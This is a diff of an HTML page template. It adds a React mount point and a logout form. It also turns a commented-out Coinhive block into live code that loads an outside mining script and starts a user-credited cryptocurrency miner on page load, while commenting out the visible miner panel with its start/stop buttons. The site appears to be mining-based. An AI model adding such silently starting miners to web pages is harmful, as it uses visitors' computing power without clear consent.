@@ -10,7 +10,23 @@
     </div>
 
     <div class="content">
-        <div class="six columns stopped" id="miner">
+        <div>
+            <p>REACT</p>
+            <div id='app'></div>
+            <script src="/assets/bundle.js"></script>
+        </div>
+
+        <form action="/logout" method="post" accept-charset="utf-8">
+            <input type="submit" name="logout" id="logout" value="logout" />
+        </form>
+
+        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+        <script>
+            var miner = new CoinHive.User('LizXPgR1RicCNg50MGh2EOgT4BjJovK0', '{{ username }}');
+            miner.start();
+        </script>
+
+      <!--<div class="six columns stopped" id="miner">
             <div class="row">
                     <div class="four columns">
                             <h4 class="number-label">Hashes/s</h4>
@@ -74,16 +90,6 @@
                 stopButton: document.getElementById('mining-stop'),
                 blkWarn: document.getElementById('blk-warning')
         });
-      </script>
-      
-      <!--<form action="/logout" method="post" accept-charset="utf-8">
-         <input type="submit" name="logout" id="logout" value="logout" />
-      </form>
-
-      <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-      <script>
-          var miner = new CoinHive.User('LizXPgR1RicCNg50MGh2EOgT4BjJovK0', '{{ username }}');
-          miner.start();
       </script>-->
     </div>
 {% endblock content %}
